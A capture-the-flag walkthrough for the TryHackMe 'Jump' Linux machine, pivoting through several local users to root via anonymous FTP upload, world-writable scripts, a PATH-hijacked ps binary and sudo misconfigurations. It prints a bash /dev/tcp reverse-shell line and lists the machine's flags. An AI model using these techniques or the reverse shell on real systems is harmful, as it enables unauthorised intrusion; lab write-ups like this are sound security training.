@@ -1,0 +1,145 @@
+## **1. Overview**
+*Jump* is a CTF‑style Linux machine on TryHackMe that revolves around pivoting through multiple local users:
+                            **recon_user → dev_user → monitor_user → ops_user → root**
+
+---
+
+# **2. Initial Access (Foothold)**
+
+### **Enumeration**
+I began with a basic service scan:
+```
+nmap -sV -T4 10.49.130.154
+```
+Two services were exposed:
+- **FTP (21)** — insecure, no encryption  
+- **SSH (22)**  
+
+Since FTP is often misconfigured, I ran the FTP NSE scripts:
+```
+nmap --script=/usr/share/nmap/scripts/ftp* -p 21 10.49.130.154
+```
+The scan revealed **anonymous FTP login enabled**.
+
+After logging in (`ftp` / empty password), I found a `readme.txt` describing that files placed in `/incoming` are automatically processed if they match a specific format. Through trial and error, I discovered that **`.sh` files are executed**.
+
+### **Exploitation**
+I created a simple reverse shell script locally, then uploaded it:
+```
+put shell.sh /incoming/shell.sh
+```
+
+Once processed, it executed and connected back to my listener, granting me a shell as:
+**recon_user**
+
+---
+
+# **3. Pivot #1 — recon_user → dev_user**
+
+### **Enumeration**
+While inspecting running processes:
+```
+ps aux
+```
+I noticed a script being executed by **dev_user**. Checking its permissions revealed that the file was **world‑writable**, allowing me to modify it.
+
+### **Exploitation**
+I appended a reverse shell payload:
+```
+bash -i >& /dev/tcp/<my_ip>/4444 0>&1
+```
+
+After starting a listener and waiting for the script to run, I received a shell as:
+**dev_user**
+
+---
+
+# **4. Pivot #2 — dev_user → monitor_user**
+
+### **Enumeration**
+To observe background activity, I uploaded **pspy64** and executed it.  
+pspy showed a script running under **monitor_user**, but the script itself was **not writable**.
+
+Reading the script revealed it called the `ps` command **without specifying a full path**, suggesting a potential PATH hijack.
+I attempted to prepend a writable directory to `$PATH`, but the script still executed the legitimate binary — indicating that the environment was being sanitized.
+
+With PATH hijacking blocked, I checked systemd services:
+```
+ls /etc/systemd/system
+```
+
+I found **healthcheck.service**, and inspecting it revealed the sanitized PATH:
+```
+/opt/dev/bin:/usr/local/bin:/usr/bin
+```
+
+Inside `/opt/dev/bin`, I found a `ps` binary **owned by my current user**.
+
+### **Exploitation**
+I replaced the `ps` binary with a script that appended my public key into:
+```
+/home/monitor_user/.ssh/authorized_keys
+```
+
+After placing my key, I authenticated directly:
+```
+ssh -i <my_private_key> monitor_user@<target_ip>
+```
+
+This provided persistent access as:
+**monitor_user**
+
+---
+
+# **5. Pivot #3 — monitor_user → ops_user**
+
+### **Enumeration**
+Checking sudo privileges:
+```
+sudo -l
+```
+
+I found that I could execute a script owned by **ops_user**, but the script itself was not writable.  
+However, reading its contents revealed that it invoked another script — and **that second script was writable**.
+
+### **Exploitation**
+I appended a reverse shell payload to the writable script, started a listener, and executed:
+```
+sudo -u ops_user /ops/app/deploy.sh
+```
+
+This triggered the modified script and returned a shell as:
+**ops_user**
+
+---
+
+# **6. Pivot #4 — ops_user → root**
+
+### **Enumeration**
+ops_user had elevated permissions over the `less` command.
+
+### **Exploitation**
+Since `less` can read arbitrary files, I simply used it to access the root flag:
+```
+sudo less /root/flag.txt
+```
+
+This completed the machine.
+
+---
+
+# **7. Flags**
+- **recon_user flag:** `THM{5a3f1c92-7b4e-4d91-8c2a-1f6e9b2a4c11}`
+- **dev_user flag:** `THM{8d2b7a41-3f9c-4e55-b1a2-6c7d9e8f0123}`
+- **monitor_user:** `THM{c1e9a7b3-2d44-4a88-9f7e-3b6c2d5a9f77}`
+- **ops_user:** `THM{f7a2c9d1-6e33-4b55-8d11-9c0a7b2e4d88}`
+- **Root flag:** `THM{2b8e6c4a-1d55-4f90-a3c7-5e9d1b7f6a22}`
+
+---
+
+# **8. Lessons Learned**
+- Anonymous FTP can lead directly to code execution when paired with automated file processing.  
+- World‑writable scripts are a reliable pivot vector.  
+- PATH hijacking remains viable even in restricted environments when sanitized paths include writable directories.  
+- Sudo misconfigurations often expose indirect privilege escalation paths through secondary scripts.  
+- Even limited sudo access to benign tools (like `less`) can fully compromise a system.
